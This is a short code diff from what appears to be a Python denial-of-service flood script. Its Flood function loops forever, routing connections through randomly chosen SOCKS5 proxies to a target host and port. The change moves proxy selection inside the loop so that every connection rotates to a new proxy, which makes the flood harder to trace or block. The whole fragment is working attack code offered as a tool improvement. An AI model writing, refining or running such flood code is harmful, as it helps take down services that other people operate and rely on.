@@ -101,14 +101,14 @@ def checkProxies():
 time.sleep(1)
 
 def Flood(indexPicker):
-    if indexPicker < len(proxies):
-        proxy = rC(proxies).strip().split(":")
-    else:
-        proxy = rC(proxies).strip().split(":")
     Connection = "Connection: Keep-Alive\r\n"
     while True:
         try:
-            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+            if indexPicker < len(proxies):
+                proxy = rC(proxies).strip().split(":")
+            else:
+                proxy = rC(proxies).strip().split(":")
+            socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]))
             s = socks.socksocket()
             s.connect((targetHost, targetPort))
             if targetPort == 443:
